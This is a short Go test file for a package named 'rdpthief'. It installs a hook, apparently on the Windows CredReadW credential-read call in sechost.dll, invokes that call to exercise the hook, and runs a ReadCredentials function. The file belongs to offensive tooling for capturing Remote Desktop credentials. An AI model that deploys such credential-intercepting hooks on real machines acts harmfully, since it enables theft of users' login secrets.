package rdpthief

import (
	"fmt"
	"testing"
	"unsafe"

	"github.com/stretchr/testify/require"
	"golang.org/x/sys/windows"
)

func TestHook_Install(t *testing.T) {
	h := Hook{}
	err := h.Install()
	require.NoError(t, err)

	ptr := windows.StringToUTF16Ptr("test")

	proc := windows.NewLazySystemDLL("sechost.dll").NewProc("CredReadW")
	ret, _, _ := proc.Call(uintptr(unsafe.Pointer(ptr)), 1, 1, 123)
	fmt.Println(ret)

}

func TestReadCredentials(t *testing.T) {
	ReadCredentials(0)
}
